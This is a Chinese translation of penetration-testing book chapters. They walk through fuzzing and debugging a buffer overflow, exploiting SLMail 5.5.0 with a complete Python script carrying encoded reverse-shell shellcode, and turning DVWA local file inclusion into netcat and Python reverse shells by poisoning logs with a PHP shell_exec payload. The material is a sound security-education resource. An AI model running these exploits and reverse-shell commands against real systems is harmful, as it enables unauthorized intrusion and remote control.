![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/00792288-d705-4522-9d70-d9ab6f5f43b7.png)

我们可以按照以下方式指定百分比：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/8fea92e7-e1db-413b-9a2d-3ddeccc488b9.png)

请注意，`vul`服务器的`HELP`命令不容易受攻击，而是`GMON ./:/`命令。我们不希望 zzuf 工具更改命令的`GMON ./:/`部分，因此我们使用`zzuf`指定`-b`（字节选项）告诉它跳过初始的 12 个字节，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/ab127506-ea8d-4e19-85d0-de7d0b4d4c69.png)

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/5684510c-3909-4bd3-8855-e2dc5271c612.png)

让我们尝试将此文件内容作为输入提供给`vul`服务器，看看会发生什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/a6f43126-e85a-47f9-874e-366b1855cefc.png)

可以看到，zzuf 工具生成的输出使`vul`服务器崩溃了。请注意，zzuf 工具生成的特殊字符是常用于模糊测试的众所周知的攻击有效载荷字符：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/91d27170-f32e-4500-89d4-6962b22a6a94.png)

我们现在将看到如何使用脚本来尝试使`vul`服务器崩溃。我们还将在 Windows 机器上使用 Olly 调试器，以查看代码在哪里中断。

以管理员身份启动 Olly 调试器，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/be9ca5ad-d1f8-408e-9068-d261fbf7c751.png)

我们现在将使用 Olly 调试器附加正在运行的服务器。转到**文件**|**附加**。这将打开所有正在运行的进程。我们必须转到 vulnserver 并将其附加。一旦单击**附加**，我们会得到以下内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/a4ddecbe-9433-4c8d-bd23-3c7f9abe1bdb.png)

现在，让我们回到 Linux 机器并启动我们创建的脚本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/4f39af92-7721-4d49-87fc-5355ab0041da.png)

当我们执行`python fuzz.py`命令时，Python 控制台上没有任何输出。

然而，在 Olly 调试器中附加的进程中，右下角显示一个黄色消息，上面写着**暂停**，这意味着附加的进程/服务器的执行已暂停：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/b043dd4b-bc84-4577-8bd6-3aacb6b09c24.png)

让我们点击播放按钮。这会执行一些代码，并在另一个断点处暂停：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/44e51191-f652-473a-9c36-af5544e1c72e.png)

应该注意的是，在屏幕底部写着`Access violation`，写入位置为`017Dxxxx`。这意味着遇到了异常，程序崩溃了：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/3f876ff5-c42a-4090-a78f-cb3c2fbfb632.png)

# Windows 和汇编

在本节中，我们将学习汇编语言。我们的目标是将 C 代码转换为汇编语言，并查看发生了什么。

以下是我们将加载和使用的示例 C 代码，以便学习汇编语言：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/ec412315-e82b-4950-a83e-dd05899c8c9c.png)

我们将在 immunity 调试器中运行这段代码，将其编译为名为`Bufferoverflow.exe`的文件。让我们首先用 immunity 调试器打开它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/dedae68a-edbc-4c52-bb80-0be7935c88bd.png)

请注意，右上角有一个**寄存器**部分。第一个寄存器`EAX`是累加器。在计算机的 CPU 中，累加器是存储中间算术和逻辑结果的寄存器。在左上角，我们有实际的汇编代码，而在左下角，我们得到程序使用的内存转储。右下角包含我们正在检查的程序的堆栈区域。

如果我们滚动到位置`00401290`，我们可以看到`PUSH`命令。我们还可以看到 ASCII 字符串`Functionfunction`，然后是整数十六进制值。这是逆序的，因为这里的处理器是使用小端记法的英特尔处理器，即低序字节先出现：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/7685ab34-35c9-432e-b8fb-990695805168.png)

前面的屏幕截图显示了我们的`functionFunction`函数的堆栈/代码部分，该部分的每个语句代表我们原始代码的一个语句。

如果我们再往下滚动一点，我们将看到实际的主方法和从那里进行的函数调用。如下所示。在突出显示的区域是对实际`functionFunction`函数的函数调用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/006a8325-644a-4a05-a991-c7789f5231f4.png)

主函数返回`0`，这正如汇编级语言所示，我们将`0`移动到 EAX 寄存器中。同样，在上一张截图中，我们将值`1`移动到 EAX 中。

现在让我们转到**调试**并点击**参数**。从这里，我们将向汇编代码提供命令行参数，以便我们可以在调试器中运行而不会出现任何错误：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/0c0c4eff-0555-4690-9ca6-7d9ee59b87ab.png)

然后，我们需要设置某些断点，以更彻底地了解调试器、程序控制和顺序流。我们将在主方法的开头设置一个断点，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/14b61521-7705-4085-9954-4908e5bd2df1.png)

断点在以下截图中突出显示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/283ce7e7-f565-4c01-8c3d-80c8e1cda940.png)

请注意，一旦我们运行应用程序，当它遇到这一行时，代码实际上会停止。这就是所谓的断点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/4d24053f-ca57-4ae1-8400-5a36bc0727d1.png)

在屏幕右下方，我们看到的区域是堆栈区域。正如我们所知，每个方法都有一个专用的执行区域，其中存储所有本地参数并执行代码。这就是我们定义为堆栈的区域。堆栈的第一条语句指向程序控制在成功执行整个方法块后应该返回的位置。请注意，屏幕顶部有四个选项，分别是**跨过**、**跨入**、**跟踪进入**和**跟踪覆盖**。随着我们的进展，我们将探索这些选项。让我们继续调用 step into，并看看堆栈和调试器会发生什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/019fc4a9-d704-463e-a17a-b851c86f8b1a.png)

调用 step into 函数实际上将控制权转移到调试器上的下一行。在这种情况下，不同的值被添加到程序变量中。请注意，以下一行将调用`functionFunction`函数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/26d70cf9-0526-4014-a425-4ed9b5e09afc.png)

请注意，从主函数到`functionFunction`函数的函数调用将发生在主函数的`004012EA`内存地址处。当调用函数时，分配给`functionFunction`的堆栈必须包含返回地址，以便一旦完成执行，它就知道自己应该返回到哪里：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/62ecee8e-890e-4d8f-b73d-7a639f83808f.png)

可以看到右侧的 EIP 寄存器保存着`00401EA`地址。请注意，在右下方，语句本身的地址是堆栈上的`0060FD0`。让我们点击下一步，看看会发生什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/e49153f7-9453-48e4-b7f2-5b2702c2008d.png)

可以看到，一旦调用函数，它的堆栈就会更新，并且指示代码在执行后应该返回到`004012EF`地址。`004012EF`地址是主函数`functionFunction`函数的下一条指令地址。由于 IP 包含下一条要执行的指令的地址，它现在包含`00401290`地址，这是`Functionfunction`函数的起始地址。一旦完成执行，堆栈顶部的内容将被弹出（`004012EF`），IP 将被更新为此地址，以便程序执行从上次停止的地方恢复。

点击两次下一步后，我们看到在我们的`functionFunction`方法中将整数值分配给变量的第一条语句将被执行。最后，当我们达到`functionFunction`方法的返回语句或结束时，我们将看到堆栈顶部将包含下面屏幕截图中显示的返回地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/b174c3f3-eb3e-4d45-9b7e-0f3449d97f9f.png)

我们可以点击下一步直到程序退出主方法。这是程序在正常情况下执行的方式，我们称之为行为执行。在下一节中，我们将看到如何使程序行为异常。

让我们看看当我们通过提供超出预期长度的参数来溢出缓冲区时，汇编语言的代码级别会发生什么。我们将在以下代码中添加超过九个字符：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/dfb45afc-5ddf-49ca-99f2-a21e634b21e6.png)

现在我们将保持在主方法中的断点，就像之前一样。当我们运行代码时，我们将到达断点，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/9e1655f4-5874-4245-9063-16bfd0c25041.png)

在下一行中，我们将把值`112233`复制到局部变量中。然后我们将调用`Functionfunction`函数，在这里`bufferoverflow`实际发生，当我们对大小为`10`的本地缓冲区执行`strcpy`时：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/84c7b8df-c026-4f13-a0b9-2c19c423372a.png)

如前面的屏幕截图所示，我们传递的字符串被放置在寄存器中，并将传递给`functionFunction`。突出显示行后的行是实际的函数调用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/b204e0a1-d9ea-4fd5-8aca-4b4359b41e8d.png)

可以看到在突出显示的行中，正在执行的操作是`strcpy(Localstring2,param)`，这意味着 EAX 寄存器的值将被移动到位置`SS:[EBP +8]`。一旦执行前面的命令，我们将注意到我们给出的大值将加载到堆栈中。我们可以在下面的屏幕截图的右下角看到这一点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/f17604eb-d2ec-41d6-ab96-4b3d5c18b114.png)

现在，将执行的下一行将是当前突出显示的`strcpy`函数之后的`strcpy`函数。我们可以在右下角看到`strcpy`函数的堆栈：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/0532e48f-9ac2-4ff6-9970-b31eebf5c0b5.png)

在`strcpy`函数中有一些缓冲区和内存位置。当我们将值写入长度为 10 的缓冲区时，缓冲区溢出，剩余的值会溢出并写入堆栈的其他内存位置。换句话说，堆栈中的其他内存位置将被溢出的内容覆盖。在这种情况下，一旦执行完成，包含堆栈返回地址的内存位置将被覆盖，因此代码将以异常结束。这实际上是发生在幕后的情况，如下面的屏幕截图所示。在屏幕截图的底部，我们可以看到访问冲突异常：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/0eda79ff-2c5e-4825-befd-6ea37550331b.png)

# 在 Windows 中利用缓冲区溢出

在 SLMail 5.5.0 邮件服务器软件中存在已知的缓冲区溢出漏洞。让我们从以下网址下载应用程序（https://slmail.software.informer.com/5.5/）并通过双击`exe`安装程序在 Windows 中安装它。安装完成后，在 Windows 7 虚拟机中运行它，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/1b3cc5c9-fa3d-492f-bb14-f3f26c4efb78.png)

现在，让我们将我们运行的程序附加到一个 immunity 调试器，并使用一个简单的 Python 模糊器来使程序崩溃，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/2a6d93c9-123a-44da-9484-57645bbd470e.png)

以下屏幕截图显示了一旦我们点击**附加**后加载的代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/a17119b9-b04d-4bdb-9d6e-6f4c97a88845.png)

让我们使用 Python 编写的简单模糊器来尝试破坏这段代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/b13b2a87-5990-4d56-93e6-edb8c4aa22d9.png)

现在，让我们运行代码，看看它是如何破坏电子邮件应用程序的，以及在崩溃时缓冲区的值是多少：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/44567dfa-40c1-4020-99a1-351cc20bd4dc.png)

可以看到，在第`2700`和`2900`字节之间发生了访问冲突异常。在这一点上，EIP 指令寄存器的值被传递的字符串`A`覆盖，其十六进制值为`41414141`。

为了找出`2900`字节内的有效负载的确切位置，我们将使用 Metasploit 的`generate.rb`模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/a689b76b-126d-4efd-b167-a5697760fdd0.png)

让我们将这个唯一生成的字符串放在一段 Python 代码中，以便为我们重新运行利用程序，以便我们可以看到崩溃时 EIP 内的唯一值：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/1f3f607c-b515-479d-8fa6-842091349b33.png)

让我们重新启动 Windows 中的服务，并再次将其附加到调试器上。最后，我们将运行我们的 Python 代码来利用它，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/29672b62-2de3-4c45-95ae-f0fd5ca467a2.png)

可以清楚地看到，在崩溃时，EIP 寄存器内的值为`39694438`。这将是告诉我们有效负载偏移量的地址，可以按照这里所示进行计算：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/6f6255f2-c601-4e7d-b6ac-15805a5046d6.png)

可以看到，导致崩溃的确切偏移量是`2606`。在崩溃时，所有传递的值都存储在 ESP 寄存器中，这使得 ESP 成为保存我们有效负载的潜在候选者。如果我们发送多达 2600 字节的有效负载，然后尝试在 EIP 中注入一条指令，使其跳转到 ESP，那么将执行有效负载。有两种方法可以做到这一点。我们知道 EIP 保存着要执行的下一条指令的地址，正如所见，崩溃时 ESP 寄存器的地址为`01C8A128`。直觉上会想到的是简单地在 2600 字节之后放置这个地址，但由于地址空间布局随机化（ASLR），这是一种用于操作系统的内存保护过程，通过使系统可执行文件加载到内存中的位置随机化，防范缓冲区溢出攻击，这种直接的技术将不起作用。

相反，让我们寻找一个内存地址，其中将有一个指令，比如`JMP ESP`。由于这个位置在堆栈之外，每当程序崩溃时，它都不会受到 ASLR 的影响。我们将使用 mona 脚本，它作为 immunity 调试器的 Python 模块随附，并用于在整个 DLL 进程中搜索任何指令，这在我们的情况下将是`jmp esp`的十六进制等价物。mona 脚本可以从[`github.com/corelan/mona`](https://github.com/corelan/mona)下载，并可以直接放置在 Windows 的以下路径中：`C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`。

让我们使用 Metasploit 的 Ruby 脚本计算`jmp esp`的十六进制等价物，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/1170644b-80eb-4e22-b683-1adc9806c0db.png)

因此，我们将在 immunity 调试器和 mona 脚本中搜索`\xff\xe4`，以找到`jmp`位置，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/cb4986e8-b335-494e-ba8a-d0f9695698f3.png)

我们得到了很多命中，但让我们选择第一个，即`0x5f4a358f`。下一步将是生成利用代码，在我们的机器上给我们一个反向 shell，并将该利用代码放在一个自定义的 Python 脚本中，以将有效负载发送到服务器。应当注意，在生成利用代码时，我们将对其进行编码并转义某些不良字符，以确保其正常工作：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/14470d44-58b2-42d9-abc7-8b9eb0678fee.png)

有了前面生成的有效负载，让我们创建一个 Python 脚本来引发利用。我们将使用之前发现的`jmp esp`的位置，通过`mona`脚本。还应该注意，由于有效负载已编码，将用于解码的几个字节，还将用于填充的几个字节：

```py
#!/usr/bin/python    
import socket        
buffer=["A"]    
counter=100
buf =  ""
buf += "\xd9\xc8\xbd\xad\x9f\x5d\x89\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x6f\x9b\xbf"
buf += "\x7c\x93\x4c\xbd\x7f\x6b\x8d\xa2\xf6\x8e\xbc\xe2\x6d"
buf += "\xdb\xef\xd2\xe6\x89\x03\x98\xab\x39\x97\xec\x63\x4e"
buf += "\x10\x5a\x52\x61\xa1\xf7\xa6\xe0\x21\x0a\xfb\xc2\x18"
buf += "\xc5\x0e\x03\x5c\x38\xe2\x51\x35\x36\x51\x45\x32\x02"
buf += "\x6a\xee\x08\x82\xea\x13\xd8\xa5\xdb\x82\x52\xfc\xfb"
buf += "\x25\xb6\x74\xb2\x3d\xdb\xb1\x0c\xb6\x2f\x4d\x8f\x1e"
buf += "\x7e\xae\x3c\x5f\x4e\x5d\x3c\x98\x69\xbe\x4b\xd0\x89"
buf += "\x43\x4c\x27\xf3\x9f\xd9\xb3\x53\x6b\x79\x1f\x65\xb8"
buf += "\x1c\xd4\x69\x75\x6a\xb2\x6d\x88\xbf\xc9\x8a\x01\x3e"
buf += "\x1d\x1b\x51\x65\xb9\x47\x01\x04\x98\x2d\xe4\x39\xfa"
buf += "\x8d\x59\x9c\x71\x23\x8d\xad\xd8\x2c\x62\x9c\xe2\xac"
buf += "\xec\x97\x91\x9e\xb3\x03\x3d\x93\x3c\x8a\xba\xd4\x16"
buf += "\x6a\x54\x2b\x99\x8b\x7d\xe8\xcd\xdb\x15\xd9\x6d\xb0"
buf += "\xe5\xe6\xbb\x17\xb5\x48\x14\xd8\x65\x29\xc4\xb0\x6f"
buf += "\xa6\x3b\xa0\x90\x6c\x54\x4b\x6b\xe7\x9b\x24\x89\x67"
buf += "\x73\x37\x6d\x99\xd8\xbe\x8b\xf3\xf0\x96\x04\x6c\x68"
buf += "\xb3\xde\x0d\x75\x69\x9b\x0e\xfd\x9e\x5c\xc0\xf6\xeb"
buf += "\x4e\xb5\xf6\xa1\x2c\x10\x08\x1c\x58\xfe\x9b\xfb\x98"
buf += "\x89\x87\x53\xcf\xde\x76\xaa\x85\xf2\x21\x04\xbb\x0e"
buf += "\xb7\x6f\x7f\xd5\x04\x71\x7e\x98\x31\x55\x90\x64\xb9"
buf += "\xd1\xc4\x38\xec\x8f\xb2\xfe\x46\x7e\x6c\xa9\x35\x28"
buf += "\xf8\x2c\x76\xeb\x7e\x31\x53\x9d\x9e\x80\x0a\xd8\xa1"
buf += "\x2d\xdb\xec\xda\x53\x7b\x12\x31\xd0\x8b\x59\x1b\x71"
buf += "\x04\x04\xce\xc3\x49\xb7\x25\x07\x74\x34\xcf\xf8\x83"
buf += "\x24\xba\xfd\xc8\xe2\x57\x8c\x41\x87\x57\x23\x61\x82"
buffer='A'*2606 + '\x8f\x35\x4a\x5f' + "\x90"*8 +buf

if 1:    
   print"Fuzzing PASS with %s bytes" %    len(string)    
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
   connect=s.connect(('192.168.250.158',110))    
   data=s.recv(1024)    
   s.send('USER root \r\n')        
   data=s.recv(1024)
   print str(data)    
   s.send('PASS    ' + buffer + '\r\n')    
   #data=s.recv(1024)
   #print str(data)    
   print "done"
   #s.send('QUIT\r\n')        
   s.close()    

```

现在，当我们将服务或进程的运行实例附加到我们的调试器并执行我们创建的脚本时，我们就可以从具有`bufferoverflow`的受害者机器获得反向 shell。如图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/e2d10261-b3b6-4e64-950e-bf039f7395ba.png)

这就是我们如何利用 Windows 中的缓冲区溢出漏洞。

如果我们继续在本地 Windows 环境中编译程序（在上一章的堆缓冲区溢出部分中给出），并使用一个长参数运行它，我们就可以利用 Windows 中的堆缓冲区溢出。

# 总结

我们在这里展示了与上一章相同的步骤，但在 Windows 环境中。 Windows 和 Linux 环境之间的概念基本相同，但堆栈和寄存器的实现可能会有所不同。因此，重要的是要熟练掌握两种环境中的利用。在下一章中，我们将开发 Python 和 Ruby 中的利用以扩展 Metasploit 框架的功能。

# 问题

1.  我们如何自动化利用 Windows 中的缓冲区溢出漏洞的过程？

1.  我们可以采取什么措施来避免操作系统施加的高级保护，例如在 Windows 中禁用堆栈上的代码执行？

1.  为什么 Windows 和 Red Hat 中的寄存器不同？

# 进一步阅读

+   堆栈缓冲区溢出 SLmail：[`www.exploit-db.com/exploits/638/`](https://www.exploit-db.com/exploits/638/)

+   堆缓冲区溢出：[`www.win.tue.nl/~aeb/Windows/hh/hh-11.html`](https://www.win.tue.nl/~aeb/Windows/hh/hh-11.html)

+   字符串格式漏洞：[`null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0x14-format-string-vulnerability-part-i-buffer-overflows-nasty-little-brother-0167254/`](https://null-byte.wonderhowto.com/how-to/security-oriented-c-tutorial-0x14-format-string-vulnerability-part-i-buffer-overflows-nasty-little-brother-0167254/)


# 第十三章：漏洞开发

在本章中，我们将探讨**利用程序开发**。我们将了解如何使用 Python 开发自定义利用程序。虽然我们的主要重点将是在 Python 中开发利用程序，但我们还将看到如何使用 Ruby 开发利用程序，以扩展 Metasploit 框架的功能。

利用程序只是一段代码，编写以利用漏洞，以便可以在不同环境中重用相同的代码。编写利用程序的目标是确保代码稳定，并且将给予攻击者他们所需的控制。应该注意，利用程序是针对特定类型的漏洞开发的。首先了解漏洞和利用它所需的手动步骤非常重要。一旦我们对此有清晰的理解，我们就可以继续自动化整个过程并开发一个利用程序。

本章将涵盖以下主题：

+   在基于 Web 的漏洞上编写脚本利用。

+   开发一个 Metasploit 模块来利用网络服务。

+   编码 shell 代码以避免检测。

# 在基于 Web 的漏洞上编写脚本利用

在本节中，我们将使用**Damn Vulnerable Web Application** (**DVWA**)的一个示例。我们将为本地和远程文件包含编写一个利用程序，并确保通过执行利用程序获得反向 shell。正如我们所知，DVWA 有许多漏洞，其中包括**本地文件包含** (**LFI**)和**远程文件包含** (**RFI**)。

本地文件包含是一种通常在 PHP 应用程序中发现的漏洞类别，是由于对`include()`和`require()`函数的不正确使用而引入的。`include()`函数用于在当前 PHP 文件中包含一个 PHP 模块，从它被调用的地方。有时开发人员会从 Web 应用程序中以输入参数的形式获取要包含的文件的名称，这可能会被攻击者滥用。攻击者可以调整输入参数，并读取系统文件，这些文件可能是他们无法访问的，比如`/etc/passwd`。相同的漏洞可以被升级以从服务器获取反向 shell。如果攻击者能够读取服务器的日志文件，通常位于`/var/log/apache2/access.log`路径下，并且攻击者发送一个伪造的`GET`请求，比如`http://myvulsite.com?id=<?php shell_exec($_GET['cmd']) ?>`，应用程序通常会返回一个错误消息，说请求的 URL/资源不存在。然而，这将被记录在服务器的`access.log`文件中。借助 LFI，如果攻击者在随后的请求中尝试加载访问日志文件，比如`http://myvulsite.com/admin.php?page=/var/log/appache2/access.log?cmd=ifconfig%00`，它会加载日志文件，其中包含一个 PHP 代码片段。这将由 PHP 服务器执行。由于攻击者正在指定 CMD 参数，这将在 shell 中执行，导致在服务器上执行意外的代码。RFI 漏洞更容易执行。让我们通过启动 DVWA 应用程序并尝试手动利用 LFI 漏洞来将我们讨论过的内容付诸实践。

应该注意，我们已经看到如何在第十二章中使用 Python 编写网络服务的利用程序，*逆向工程 Windows 应用程序*，在那里我们编写了一个自定义的 Python 利用程序来利用 SLmail 服务。请参考该章节，以刷新您对针对缓冲区溢出的基于服务的利用程序开发的知识。

# 手动执行 LFI 利用

让我们开始启动 Apache 服务器：

```py
service apache2 start
```

让我们尝试手动浏览应用程序，看看漏洞在哪里：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/22c584ef-a902-4881-b84e-011785536376.png)

前面屏幕中浏览的 URL 是`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=include.php`。可以看到，请求的 URL 有一个 page 参数，它将要包含的页面作为参数。如果我们查看应用程序的源代码，我们可以看到`include()`函数的实现如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/4251eb69-3f5b-4576-b281-a35dbac69266.png)

前面的截图将文件变量初始化为在`GET`请求中获得的参数，没有任何过滤。

下一个截图使用与`include()`函数下相同的文件变量如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/8edcde7b-3482-447b-80e8-9a7927bc0b64.png)

如上所示，`include()`函数包含`$file`变量的任何值。让我们尝试利用这一点，通过访问以下 URL 读取我们可能无法访问的任何系统文件，比如`/etc/passwd`：`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/etc/passwd`

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/d2e9ffdb-422e-405e-bc5a-32de76e5524d.png)

现在让我们进一步升级攻击，尝试从 LFI 漏洞中获得 shell。让我们使用`Netcat`来为我们毒害日志文件，以便从服务器获得 shell。

应该注意的是，我们不应该尝试通过 URL 毒害日志文件。这样做将使我们的有效负载编码为 URL 编码，使攻击无效。

让我们首先尝试查看 Apache 日志文件的内容，并在我们的浏览器窗口中使用以下 URL 加载它：`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/7bb7967c-dc92-41d6-b24c-c8f020643e36.png)

如前面的截图所示，日志文件的内容显示在页面上。现在让我们继续尝试使用`netcat`毒害日志文件。首先，按以下方式启动 Netcat：`nc 192.168.1.102 80`。一旦启动，向服务器发送以下命令：`http://192.168.1.102/dvwa?id=<?php echo shell_exec($_GET['cmd']);?>`

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/d32a907e-459e-4a88-b7a9-14f67b5ce1d3.png)

中了！我们现在毒害了我们的日志文件。现在让我们尝试发出诸如`ifconfig`之类的命令，看看是否会被执行。我们将浏览的 URL 如下：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=ifconfig`。

注意`cmd`参数。我们发送`ifconfig`命令，该命令将由以下代码行调用：

`<?php echo shell_exec($_GET['cmd']);?>`，翻译为`<?php echo shell_exec(ifconfig)?>`

在下面的截图中突出显示的区域显示我们的命令已成功执行。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/9735f03d-5ff3-45bc-9ccc-a0611ebbab1a.png)

现在让我们尝试从相同的`cmd`参数中获得一个反向 shell。我们将使用`netcat`来获得反向 shell。如果服务器上没有安装 netcat，我们也可以使用 Python 来获得 shell。让我们看看两者的效果。

# 使用 Netcat 进行反向 shell

在这种情况下，URL 和命令将如下：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=nc -e /bin/sh 192.168.1.102 4444`。

我们还需要设置一个`netcat`监听器，它将在端口`4444`上监听传入的连接。让我们在另一个终端上执行`nc -nlvp 4444`命令。现在，浏览 URL，看看我们是否得到了 shell：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/6cb31672-8088-4619-8644-f3f2fd021296.png)

浏览此 URL 后，让我们尝试查看我们生成的`netcat`监听器，看看我们是否获得了 shell：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/ac74a96b-fa99-40f3-b85e-5b63cc020431.png)

可以验证，我们得到了一个低权限的 shell，`www-data`。

# 使用 Python 进行反向 shell

现在，假设服务器上没有安装 Netcat。我们将使用 Python 来获得 shell。由于底层服务器是基于 Linux 的，默认情况下会安装 Python。因此，我们将修改我们的利用命令如下：

`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget http://192.168.1.102/exp.py -O /tmp/exp.py`

可以看到，我们将创建一个用 Python 编写的漏洞利用文件，并在攻击者机器上提供服务。由于在当前示例中，攻击者和受害者都在同一台机器上，URL 是`http://192.168.1.102`。漏洞利用文件的内容如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/7c01434c-6c79-4696-a69a-3724bb041b29.png)

下载漏洞利用文件将完成我们利用过程的第一步。第二步将是执行它并获取回监听器。这可以通过访问以下 URL 来执行：`http://192.168.1.102/dvwa/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=python /tmp/exp.py`

让我们看看这个实际操作：

1.  在`/tmp`文件夹中下载并保存 Python 漏洞利用程序：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=wget http://192.168.1.102/exp.py -O /tmp/exp.py`

1.  验证是否已成功保存：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/30c5c1f9-b9d3-44b6-b144-48fc116ae178.png)

1.  在`444`上启动`netcat`监听器：`nc -nlvp 4444`。

1.  启动调用`exp.py`脚本连接回攻击者主机的命令：`http://192.168.1.102/dvwa/vulnerabilities/fi/page=/var/log/apache2/access.log&cmd=python /tmp/exp.py`。

让我们看看我们的监听器是否已经获得了 shell：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/hsn-pentest-py/img/67be60de-978e-41d0-9b6e-ca8163c01804.png)

从前面的截图中可以看到，我们已成功获得了 shell。

# 漏洞利用开发（LFI + RFI）

到目前为止，我们已经学习了如何手动利用 LFI 漏洞。让我们继续尝试开发一个通用的漏洞利用程序，它将利用 LFI 漏洞以及其他相同的应用程序。在本节中，我们将看到如何编写一个了不起的漏洞利用程序，它将利用 DVWA 应用程序中的 RFI 和 LFI 漏洞。尽管这个漏洞利用程序是为 DVWA 应用程序编写的，但我尝试使它通用化。通过一些调整，我们也可以尝试将其用于其他可能存在 LFI 和 RFI 漏洞的应用程序。

让我们安装前提条件：

```py
pip install BeautifulSoup
pip install bs4
pip install selenium
sudo apt-get install libfontconfig
apt-get install npm
npm install ghostdriver
wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2
